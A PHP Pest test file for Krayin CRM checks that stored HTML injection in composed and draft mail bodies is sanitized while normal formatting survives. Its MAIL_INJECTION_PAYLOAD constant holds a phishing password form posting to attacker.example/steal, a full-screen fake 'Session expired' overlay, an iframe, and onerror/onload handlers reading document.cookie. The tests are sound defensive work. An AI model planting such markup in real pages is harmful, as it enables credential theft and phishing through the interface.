<?php

use Illuminate\Foundation\Testing\DatabaseTransactions;
use Webkul\Email\Models\Email;

/**
 * Stored HTML injection through the mail compose body.
 *
 * The compose editor's source-code view (or a direct POST) let a user store arbitrary markup in a
 * mail body. It was rendered in the Outbox/Sent view of every user with mail access, so media
 * players, a password form posting to a foreign host, and a full-screen `position: fixed` overlay
 * could be planted in the admin panel. No script ran, but the UI could be spoofed for phishing.
 *
 * The body is now passed through the core rich-text sanitizer before it is stored, and the mail
 * views render it through a stricter, mail-specific client-side profile as a second layer.
 */
uses(DatabaseTransactions::class);

const MAIL_INJECTION_PAYLOAD = '<p>Quarterly update</p>'
    .'<audio controls><source src="demo.ogg" type="audio/ogg"><source src="demo.mp3" type="audio/mpeg"></audio>'
    .'<video controls src="https://attacker.example/x.mp4"></video>'
    .'<form action="https://attacker.example/steal" method="post"><input type="password" name="pw"><button>Sign in</button></form>'
    .'<div style="position:fixed;inset:0;z-index:99999;background:#fff">Session expired</div>'
    .'<img src=x onerror="alert(document.cookie)">'
    .'<svg onload="alert(document.domain)"></svg>'
    .'<iframe src="https://attacker.example"></iframe>'
    .'<script>alert(1)</script>';

function expectMailBodyNeutralised(string $reply): void
{
    expect($reply)->toContain('Quarterly update')
        ->not->toContain('<audio')
        ->not->toContain('<video')
        ->not->toContain('<source')
        ->not->toContain('<form')
        ->not->toContain('<input')
        ->not->toContain('<button')
        ->not->toContain('attacker.example')
        ->not->toContain('position')
        ->not->toContain('onerror')
        ->not->toContain('onload')
        ->not->toContain('<iframe')
        ->not->toContain('<script');
}

it('strips injected markup from a composed mail body before it is stored', function () {
    test()->actingAs(getDefaultAdmin(), 'user')
        ->post(route('admin.mail.store'), [
            'subject' => 'Mail body injection',
            'reply' => MAIL_INJECTION_PAYLOAD,
            'reply_to' => ['victim@example.invalid'],
        ])
        ->assertRedirect()
        ->assertSessionHasNoErrors();

    $email = Email::query()->where('subject', 'Mail body injection')->latest('id')->firstOrFail();

    expectMailBodyNeutralised($email->reply);
});

it('strips injected markup when a draft body is edited', function () {
    test()->actingAs(getDefaultAdmin(), 'user')
        ->post(route('admin.mail.store'), [
            'is_draft' => 1,
            'subject' => 'Draft body injection',
            'reply' => '<p>Draft</p>',
            'reply_to' => ['victim@example.invalid'],
        ])
        ->assertRedirect();

    $draft = Email::query()->where('subject', 'Draft body injection')->latest('id')->firstOrFail();

    test()->actingAs(getDefaultAdmin(), 'user')
        ->put(route('admin.mail.update', $draft->id), [
            'reply' => MAIL_INJECTION_PAYLOAD,
        ])
        ->assertRedirect()
        ->assertSessionHasNoErrors();

    expectMailBodyNeutralised($draft->refresh()->reply);
});

it('keeps the formatting a composed mail legitimately uses', function () {
    $body = '<p><strong>Hello</strong> <em>there</em>, <span style="color:#e03e2d;">see</span> '
        .'<a href="https://krayincrm.com" target="_blank">our site</a>.</p>'
        .'<ul><li>One</li></ul>'
        .'<table><tbody><tr><td>Cell</td></tr></tbody></table>'
        .'<p><img src="https://krayincrm.com/logo.png" alt="logo"></p>';

    test()->actingAs(getDefaultAdmin(), 'user')
        ->post(route('admin.mail.store'), [
            'subject' => 'Mail body formatting',
            'reply' => $body,
            'reply_to' => ['someone@example.invalid'],
        ])
        ->assertRedirect()
        ->assertSessionHasNoErrors();

    $reply = Email::query()->where('subject', 'Mail body formatting')->latest('id')->firstOrFail()->reply;

    expect($reply)->toContain('<strong>Hello</strong>')
        ->toContain('<em>there</em>')
        ->toContain('color:#e03e2d;')
        ->toContain('href="https://krayincrm.com"')
        ->toContain('<li>One</li>')
        ->toContain('<td>Cell</td>')
        ->toContain('src="https://krayincrm.com/logo.png"');
});

it('renders mail bodies through the mail sanitizing profile', function (string $view) {
    expect(file_get_contents(base_path("packages/Webkul/Admin/src/Resources/views/mail/{$view}.blade.php")))
        ->toContain('v-safe-html:mail=')
        ->not->toMatch('/v-safe-html="(email\.reply|truncatedReply)/');
})->with(['view', 'index']);
